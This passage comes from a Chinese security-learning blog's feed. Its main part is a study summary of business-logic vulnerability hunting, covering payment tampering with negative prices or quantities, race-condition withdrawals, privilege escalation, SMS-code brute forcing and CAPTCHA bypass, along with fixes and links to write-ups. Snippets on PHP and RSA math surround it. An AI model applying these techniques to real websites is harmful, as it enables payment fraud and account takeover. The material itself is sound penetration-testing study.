<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($value);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">//使用不同的变量名</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$value "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $val) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$val "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> </span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑漏洞挖掘学习总结</title>
    <url>/2018/09/17/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="逻辑漏洞挖掘学习（总结完善）"><a href="#逻辑漏洞挖掘学习（总结完善）" class="headerlink" title="逻辑漏洞挖掘学习（总结完善）"></a>逻辑漏洞挖掘学习（总结完善）</h2><blockquote>
<p>近学习了一下挖逻辑漏洞，针对逻辑漏洞学习到的点做一下总结，主要以看思路和漏洞实例在 学习，参考链接就是总结中的链接以及与这些链接相关的网站，太多了，就直接在文章总列举出 来了。逻辑漏洞的挖掘主要还是在数据包的各个参数上，一定要细心。</p>
</blockquote>
<h3 id="工具：BurpSuit-主要的逻辑漏洞的挖掘工具"><a href="#工具：BurpSuit-主要的逻辑漏洞的挖掘工具" class="headerlink" title="工具：BurpSuit(主要的逻辑漏洞的挖掘工具)"></a>工具：BurpSuit(主要的逻辑漏洞的挖掘工具)</h3><h3 id="思路：复杂灵活"><a href="#思路：复杂灵活" class="headerlink" title="思路：复杂灵活"></a>思路：复杂灵活</h3><h3 id="核心：绕过真实身份认证或者正常业务流程达到预期目的"><a href="#核心：绕过真实身份认证或者正常业务流程达到预期目的" class="headerlink" title="核心：绕过真实身份认证或者正常业务流程达到预期目的"></a>核心：绕过真实身份认证或者正常业务流程达到预期目的</h3><h3 id="用户身份：认证（用户身份特性认证）"><a href="#用户身份：认证（用户身份特性认证）" class="headerlink" title="用户身份：认证（用户身份特性认证）"></a>用户身份：认证（用户身份特性认证）</h3><ul>
<li>本地认证</li>
<li>服务端认证</li>
</ul>
<h3 id="业务流程：对业务流程的熟悉程度（各类型网站-业务模式）"><a href="#业务流程：对业务流程的熟悉程度（各类型网站-业务模式）" class="headerlink" title="业务流程：对业务流程的熟悉程度（各类型网站+业务模式）"></a>业务流程：对业务流程的熟悉程度（各类型网站+业务模式）</h3><ul>
<li>制定漏洞模型</li>
<li>重点业务功能区：个人信息区域、密码修改区域、密码忘记区域、支付区域、手机号区域等</li>
</ul>
<h3 id="逻辑漏洞的类型："><a href="#逻辑漏洞的类型：" class="headerlink" title="逻辑漏洞的类型："></a>逻辑漏洞的类型：</h3><h4 id="支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）"><a href="#支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）" class="headerlink" title="支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）"></a>支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）</h4><h5 id="订单："><a href="#订单：" class="headerlink" title="订单："></a>订单：</h5><ul>
<li>选择商品时修改商品的价格（也可以在确认订单的时候修改订单，可以改小或者改为负数）</li>
<li>选择商品时更改商品的数量（如设置为负数）<ul>
<li>比如在一个服务器购买网站，他们的硬盘是按G来算的，就好像1G只要1元(假设)，2G只要2元，以此类推，比如那个服务器总共需要200元，我们是否可以修改G的数量来减少支付价格呢，比如我们把G改成-19</li>
</ul>
</li>
<li>商品剩余为一件时，多人同时购买是否产出冲突</li>
<li>生成订单时修改订单的金额</li>
<li>商品为0时是否还可以购买</li>
</ul>
<h5 id="结算："><a href="#结算：" class="headerlink" title="结算："></a>结算：</h5><ul>
<li>优惠活动时打折、优惠券的多次使用<ul>
<li>比如在某商城活动的时候领取优惠券，20元的产品规定只能使用5元的，可以修改为15元等</li>
<li><a href="https://www.secpulse.com/archives/40336.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/40336.html</a></li>
</ul>
</li>
<li>截断数据包，结算的时候修改订单数量、金额<ul>
<li>比如A产品100元，改为-90元</li>
<li>在很多时候，我们都忽略了一个问题，那就是在购买一件商品的时候，我们都喜欢修改成0.01或者负数，但是这里是有一个积分的，就是比如我们在购买1元产品的时候可以获得100积分，但是我们如果将金额数小于1元的话积分就肯定是为空的了，因为这里的积分是按100/元来算的，也就是说，如果我们看到购买xx元有送积分的，我们可以来尝试一下把金额数改成积分最低数，就比如1元。</li>
<li>比如我们在某网站，他们用的是自家的钱包(迷你钱包),这个钱包作用也仅是用于这一个站，在提现时，没有任何验证码或者校验机制，只要输入体现金额就可以提现，并且是秒到账，如果什么负数，修改金额都测试过了都不行，那么你就可以试试多线程并发问题,提现时抓包，比如我现在钱包内有0.1元，那么按理说每提0.01可以提现10次，也就是发送10次进程，但是利用这个问题可以达到多发现几次成功的进程，提现时抓包，然后把数据包发送到BurpSuite工具的Intruder当中，进行批量发送18次，然后可以看到成功的提现到了12次（并发、数据库操作加锁）</li>
<li>比如a产品为999元，当我们购买的时候我们可以试试修改数量成-1个，看是否有变成-999元，我们点击支付一下，一般来说，都可能支付失败的，因为这个时候服务器验证了这个价格是否和服务器中对应的价格是否一样，此时我们可以将-999元的产品放到购物车，再去此网站购买一个1000元产品的购物车，然后我们可以来点击购买，可以看到支付价格就变成了1元(1000+(-999)=1)了</li>
</ul>
</li>
<li>截断数据包，结算的时候修改支付方式（第三方的支付接口逻辑设计不严格就会产生）<ul>
<li>比如将百度钱包的接口、微信支付等改为一个其他的接口，如果逻辑设计不严格就会产生漏洞</li>
</ul>
</li>
<li>伪造订单，刷单<ul>
<li>例如：在购买一个产品的时候，目标程序时用过A参数判断是否支付，比如A=1实时表示支付，A=0时表示未支付，通过修改可控的A来验证是否可以伪造订单、等。</li>
</ul>
</li>
<li>重复支付（请求重放、多次下单）<ul>
<li>比如一些商场中有一些试用卡之类的，通过某种渠道获得的(比如签到，分享网站信息，购买某个商品送来的)，当我们试用的时候主动取消试用，那么这个时候试用卡可能会返回到我们账户中，这里的问题就是如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子。</li>
<li>比如，我在试用某个产品的时候，每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷得问题</li>
</ul>
</li>
<li>越权支付<ul>
<li>比如我们在购买某产品的时候，支付时会出现当前用户的ID，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品</li>
</ul>
</li>
<li>参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值</li>
</ul>
<h5 id="支付漏洞突破口："><a href="#支付漏洞突破口：" class="headerlink" title="支付漏洞突破口："></a>支付漏洞突破口：</h5><ul>
<li>截断数据包，伪造第三方的确认信息</li>
<li>绕过商家确认直接退货</li>
<li>绕过商品类型直接退货（退货是否被允许，比如虚拟商品，话费等）</li>
<li>绕过客户端验证直接确认收货</li>
</ul>
<h5 id="支付漏洞实例："><a href="#支付漏洞实例：" class="headerlink" title="支付漏洞实例："></a>支付漏洞实例：</h5><ul>
<li><a href="https://www.0dayhack.com/post-832.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-832.html</a></li>
<li><a href="https://www.bigniu.com/bug/view/935" target="_blank" rel="noopener">https://www.bigniu.com/bug/view/935</a></li>
<li><a href="https://www.bigniu.com/bug/view/929" target="_blank" rel="noopener">https://www.bigniu.com/bug/view/929</a></li>
<li><a href="https://www.secpulse.com/archives/47665.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/47665.html</a></li>
<li><a href="https://www.secpulse.com/archives/41144.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41144.html</a></li>
<li><a href="https://www.secpulse.com/archives/39768.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/39768.html</a></li>
<li><a href="https://www.secpulse.com/archives/36412.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/36412.html</a></li>
<li><a href="https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式）</a></li>
<li><a href="https://www.secpulse.com/archives/35701.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35701.html</a></li>
<li><a href="https://www.secpulse.com/archives/35188.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35188.html</a></li>
<li><a href="http://www.freebuf.com/vuls/151196.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/151196.html</a></li>
</ul>
<h5 id="支付漏洞修复方案："><a href="#支付漏洞修复方案：" class="headerlink" title="支付漏洞修复方案："></a>支付漏洞修复方案：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">和银行交易时，做数据签名，对用户金额和订单签名。</span><br><span class="line">敏感参数不要明文放在URL中</span><br><span class="line">服务端效验客户端提交的参数</span><br><span class="line">在服务端计算金额的时候，一定要判断是否为正数。</span><br><span class="line">支付过程中加一个服务器生成的key，用户校验参数有没有被串改。</span><br><span class="line">如果一定需要用URL传递相关参数，建议进行后端的签名验证</span><br><span class="line">订单金额和充值接口返回的数据进行校验</span><br><span class="line">提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。</span><br><span class="line">支付时应从服务器拉取数据，而不是直接读客户端的值！！</span><br></pre></td></tr></table></figure>
<h4 id="密码重置漏洞："><a href="#密码重置漏洞：" class="headerlink" title="密码重置漏洞："></a>密码重置漏洞：</h4><h5 id="用户密码找回方式："><a href="#用户密码找回方式：" class="headerlink" title="用户密码找回方式："></a>用户密码找回方式：</h5><ul>
<li>手机短信验证码<ul>
<li><a href="https://www.secpulse.com/archives/36619.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/36619.html</a></li>
<li><a href="https://www.secpulse.com/archives/35564.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35564.html</a></li>
<li><a href="https://www.secpulse.com/archives/35488.html（直接改返回包）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35488.html（直接改返回包）</a></li>
<li><a href="https://www.secpulse.com/archives/35169.html（通过越权修改）" target="_blank" rel="noopener">https://www.secpulse.com/archives/35169.html（通过越权修改）</a></li>
<li><a href="https://www.secpulse.com/archives/35023.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/35023.html</a></li>
<li><a href="https://www.secpulse.com/archives/34710.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/34710.html</a></li>
<li><a href="https://www.secpulse.com/archives/33800.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/33800.html</a></li>
</ul>
</li>
<li>邮箱（密码找回链接）</li>
<li>自动生成新密码</li>
</ul>
<h5 id="密码重置突破口："><a href="#密码重置突破口：" class="headerlink" title="密码重置突破口："></a>密码重置突破口：</h5><ul>
<li>认证凭证暴力破解（多数为验证码4位及以下的纯数字，验证码时间长，不失效可爆破）<ul>
<li><a href="https://bysec.io/detailsMasked.pyp?id=5" target="_blank" rel="noopener">https://bysec.io/detailsMasked.pyp?id=5</a></li>
<li><a href="https://www.secpulse.com/archives/41168.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41168.html</a></li>
</ul>
</li>
<li>认证凭证回显（明文传输）<ul>
<li><a href="https://www.secpulse.com/archives/49496.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/49496.html</a></li>
</ul>
</li>
<li>认证凭证重复使用（比如验证码重复使用）</li>
<li>重新绑定（如重新绑定邮箱、手机号且自己可控）<ul>
<li><a href="https://www.test404.com/post-1352.html?wafcloud_antihack=2" target="_blank" rel="noopener">https://www.test404.com/post-1352.html?wafcloud_antihack=2</a></li>
<li><a href="https://xz.aliyun.com/t/2011（密码重置里面、越权）" target="_blank" rel="noopener">https://xz.aliyun.com/t/2011（密码重置里面、越权）</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-23318-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23318-1-1.html</a></li>
</ul>
</li>
<li>用户身份特性认证（token生成可控）</li>
<li>服务器端认证为空、直接删除验证码、或者认证的特征值可控：<ul>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值）</a></li>
</ul>
</li>
<li>本地认证、修改返回值<ul>
<li><a href="https://www.secpulse.com/archives/37864.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/37864.html</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-23319-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23319-1-1.html</a></li>
</ul>
</li>
<li>删除校验码绕过</li>
<li>cookie覆盖<ul>
<li><a href="https://bbs.ichunqiu.com/thread-38176-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-38176-1-1.html</a></li>
</ul>
</li>
</ul>
<h4 id="任意用户登录："><a href="#任意用户登录：" class="headerlink" title="任意用户登录："></a>任意用户登录：</h4><ul>
<li>空密码绕过（绕过前端改为空值）</li>
<li>身份替换（登录成功产生session）</li>
<li>认证凭证绕过</li>
<li>枚举、越权<ul>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过）</a></li>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸）</a></li>
</ul>
</li>
</ul>
<h4 id="认证缺陷漏洞："><a href="#认证缺陷漏洞：" class="headerlink" title="认证缺陷漏洞："></a>认证缺陷漏洞：</h4><ul>
<li>弱验证</li>
<li>空验证</li>
<li>认证凭证有效性、唯一性<ul>
<li><a href="http://www.heavensec.org/index.php/1613.html" target="_blank" rel="noopener">http://www.heavensec.org/index.php/1613.html</a></li>
</ul>
</li>
</ul>
<h5 id="身份验证码之暴力破解-（https-bbs-ichunqiu-com-thread-45640-1-1-html）"><a href="#身份验证码之暴力破解-（https-bbs-ichunqiu-com-thread-45640-1-1-html）" class="headerlink" title="身份验证码之暴力破解  （https://bbs.ichunqiu.com/thread-45640-1-1.html）"></a>身份验证码之暴力破解  （<a href="https://bbs.ichunqiu.com/thread-45640-1-1.html）" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45640-1-1.html）</a></h5><ul>
<li>无防护措施（没有对登录、注册、重置密码之类的功能进行一定的防护，所以当碰到没有验证码的，没有对输错密码次数进行限制，而且还是明文传输的系统，先可以考虑爆破）</li>
<li>锁定机制——&gt;撞库（有些系统会有一些防护措施，比如超过一定的错误次数会将账号进行锁定，或者是某IP频繁的进行登录操作会封IP，这是后可以进行撞库，用弱密码遍历用户名；有些限制并没有在后台验证，也可以加入XFF等方式绕过）<ul>
<li>修复：限制单位时间内执行某项操作的次数，要对限制的方法、次数等进行详细的说明，限制的验证也应该再服务端</li>
</ul>
</li>
<li>验证码（可以防止自动化攻击）<ul>
<li>图片验证码——&gt;绕过（图片验证码反复使用、验证码在前端校验、验证码可识别、验证码在客户端传输）</li>
<li>短信验证码——&gt;爆破/绕过（与图片类似）</li>
<li>修复：所有的验证码生存周期都应该是一次性的，无论校验成功与失败，且验证码加入干扰线，变形等防止机器识别，对于可爆破的参数加上人机识别，通过设置的阀值来判断；同时验证过程不应将有助于推测正确验证答案的信息返回到客户端。</li>
<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909</a></li>
</ul>
</li>
</ul>
<h4 id="越权："><a href="#越权：" class="headerlink" title="越权："></a>越权：</h4><ul>
<li><p>水平越权</p>
<ul>
<li><p>实例：</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.bigniu.com/bug/view/926</span><br><span class="line">https://xz.aliyun.com/t/2011</span><br><span class="line">https://www.secpulse.com/archives/41142.html</span><br><span class="line">https://www.secpulse.com/archives/38473.html</span><br><span class="line">https://www.secpulse.com/archives/35169.html</span><br><span class="line">https://bbs.ichunqiu.com/thread-39287-1-1.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0196245.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0194518.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193632.html(越权删除+敏感信息泄露)</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192676.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192848.html（越权任意用户修改+信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权修改+密码重置）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191930.html（整站越权+通过组合越权获取所有信息）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191192.html（爆破+越权）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0190106.html（绕过signature字段达到越权）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189823.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0188760.html（越权之信息泄露）</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0187544.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>垂直越权</p>
<ul>
<li><p>实例：</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2011</span><br><span class="line">https://www.secpulse.com/archives/41174.html</span><br><span class="line">https://www.secpulse.com/archives/37083.html</span><br><span class="line">http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189507.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>未授权访问（登录凭证验证）</p>
</li>
<li><p>绕过授权模式（参数构造）</p>
</li>
</ul>
<h4 id="敏感信息泄露："><a href="#敏感信息泄露：" class="headerlink" title="敏感信息泄露："></a>敏感信息泄露：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.bigniu.com/bug/view/930</span><br><span class="line">https://www.bigniu.com/bug/view/928</span><br><span class="line">https://www.bigniu.com/bug/view/927</span><br><span class="line">https://www.secpulse.com/archives/47842.html</span><br><span class="line">https://www.secpulse.com/archives/47482.html</span><br><span class="line">https://www.secpulse.com/archives/42603.html</span><br><span class="line">https://www.secpulse.com/archives/41375.html</span><br><span class="line">https://www.secpulse.com/archives/41253.html</span><br><span class="line">https://www.secpulse.com/archives/41144.html</span><br><span class="line">https://www.secpulse.com/archives/40909.html</span><br></pre></td></tr></table></figure>
<h4 id="接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历"><a href="#接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历" class="headerlink" title="接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历"></a>接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历</h4><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><blockquote>
<p>在学习过程中对于遇见的一些新学习到的业务逻辑测试方法的总结</p>
</blockquote>
<h3 id="争对客户端刷新验证码的绕过"><a href="#争对客户端刷新验证码的绕过" class="headerlink" title="争对客户端刷新验证码的绕过"></a>争对客户端刷新验证码的绕过</h3><ol>
<li><p>在一些有验证码的站点，每次进行验证的验证码都是通过第三方的接口调用的，有些验证码是通过<img src>加载的，这个时候直接访问加载的地址显示直接就是验证码，所以，正对这种验证码的刷新就可以通过拦截数据包，刚好卡在验证码链接跳转的那一步，进行重放，通过这种方法来绕过。这里通过漏洞银行直播中的两张图来说明</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539268118.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539265914.99.png" alt></p>
</li>
</ol>
<h3 id="对于滑动验证码的的绕过"><a href="#对于滑动验证码的的绕过" class="headerlink" title="对于滑动验证码的的绕过"></a>对于滑动验证码的的绕过</h3><ol>
<li>现在有好多网站都是滑动验证码，在学习了漏洞银行直播中的业务逻辑挖掘做一个笔记：<ol>
<li>首先在滑动验证码哪里查看JS代码，看一下JS代码，看组件是怎么构造加载的，然后确定滑动验证码需要的一些参数</li>
<li>curl 等方式获取页面，查找一些需要的参数</li>
<li>通过获取的参数构造正常滑动以后的链接作为payload</li>
<li>通过curl 访问payload获取数据<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1539266990.35.png" alt></li>
</ol>
</li>
</ol>
<h3 id="net-Nlog日志泄露"><a href="#net-Nlog日志泄露" class="headerlink" title=".net  Nlog日志泄露"></a>.net  Nlog日志泄露</h3><ol>
<li>对于现在许多.net的网站，一般在遇到.net的网站访问一些目录时报404/403等，就会放弃。其实.net的网站有Nlog日志，通过Nlog的特性构造一些payload就可以访问有些站点的Nlog日志，里面可能会包含敏感信息。<ol>
<li>关于Nlog的特性一下文章有说明：<a href="http://www.cnblogs.com/felixnet/p/5498759.html" target="_blank" rel="noopener">http://www.cnblogs.com/felixnet/p/5498759.html</a></li>
<li>关于payload主要就是拼接当前的一些时间等关键值</li>
</ol>
</li>
</ol>
<h3 id="xxe接口越权"><a href="#xxe接口越权" class="headerlink" title="xxe接口越权"></a>xxe接口越权</h3><ol>
<li>xxe的越权，这里还是一些网站使用的接口权限设置不当造成的，路劲可以通过dirb探测等等。</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>渗透测试</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA总结</title>
    <url>/2018/09/02/RSA%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="关于RSA的一些总结"><a href="#关于RSA的一些总结" class="headerlink" title="关于RSA的一些总结"></a>关于RSA的一些总结</h2><blockquote>
<p>最近一段时间比赛比较多，密码学的题也是各种各样的，有时候会碰到RSA，想想上学期学的数论，RSA就讲了整整一个月，最后发现代码上还是应用不了，就像没学一样，毕竟在实际生活中好多加密算法都是设计好的。为了让学过的东西不要白学，抽点时间结合题目，对RSA进行一下总结，网上好多关于RSA的文章写的都挺好的，但还是喜欢自己动手做一遍。本文没有啥原创的东西，主要是对学习的一个记录。</p>
</blockquote>
<h3 id="RSA简介："><a href="#RSA简介：" class="headerlink" title="RSA简介："></a>RSA简介：</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535850694.5.png" alt></p>
<ul>
<li><p>上图是对RSA算法非对称加解密的一个描述，也是RSA算法最根本的东西，下面说一下RSA算法被攻击的可能性（有没有在知道公钥的情况下推导出私钥）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535851071.47.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要知道的理论是：</span><br><span class="line">    ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。 </span><br><span class="line">    φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。 </span><br><span class="line">    n=pq。只有将n因数分解，才能算出p和q。</span><br><span class="line">所以：如果n可以被分解，那就可以推到出d,私钥就可以被破解，但实际上p,q是大素数，分解是很困难的</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些理论支撑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">欧拉函数：φ(n)是小于等于n的数中与n互质的数的数目</span><br><span class="line">欧拉函数是积性函数——若p,q互质，φ(p*q)= φ(p) *φ(q) </span><br><span class="line">若p为质数，则φ(p)=p-1</span><br><span class="line"></span><br><span class="line">同余定理：给定一个正整数m，如果两个整数a和b满足（a-b）能够被m整除，即（a-b）/m得到一个整数，那么就称整数a与b对模m同余，记作a≡b(mod m)。 </span><br><span class="line">性质： </span><br><span class="line">1 自反性 a≡a (mod m) </span><br><span class="line">2 对称性 若a≡b(mod m)，则b≡a (mod m) </span><br><span class="line">3 传递性 若a≡b (mod m)，b≡c (mod m)，则a≡c (mod m) </span><br><span class="line">4 同余式相加 若a≡b (mod m)，c≡d(mod m)，则a+-c≡b+-d (mod m) </span><br><span class="line">5 同余式相乘 若a≡b (mod m)，c≡d(mod m)，则ac≡bd (mod m)</span><br><span class="line"></span><br><span class="line">求逆元：指有一个整数d，可以使得e*d被φ(n)除的余数为1，即e*d ≡ 1 (mod φ(n))，这个式子等于e*d - 1 = k*φ(n)</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些程序代码上的支撑：（都是用python实现算法的应用）</p>
<ul>
<li><p>快速幂取模：等价于pow方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod</span><span class="params">(c,d,n)</span>:</span><span class="comment">#等价于自带的pow(c,d,n)</span></span><br><span class="line">    r=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> d&gt;<span class="number">0</span>:</span><br><span class="line">        c=c%n</span><br><span class="line">        <span class="keyword">if</span> d&amp;<span class="number">1</span>:</span><br><span class="line">            r=(r*c)%n</span><br><span class="line">        d&gt;&gt;=<span class="number">1</span></span><br><span class="line">        c=(c*c)%n</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure>
</li>
<li><p>模逆运算（就是求逆元，主要基于扩展欧几里得算法）</p>
<ul>
<li><p>python实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">     <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x , y , q = egcd( b , a % b ) 	 <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">         x , y = y, ( x - (a // b) * y )</span><br><span class="line">         <span class="keyword">return</span> x, y, q </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> egcd(a,b)[<span class="number">0</span>]%b 				<span class="comment">#求a模b得逆元</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>出来通过自己编写实现之外还可以通过gmpy2和libnum这两个库函数实现：</p>
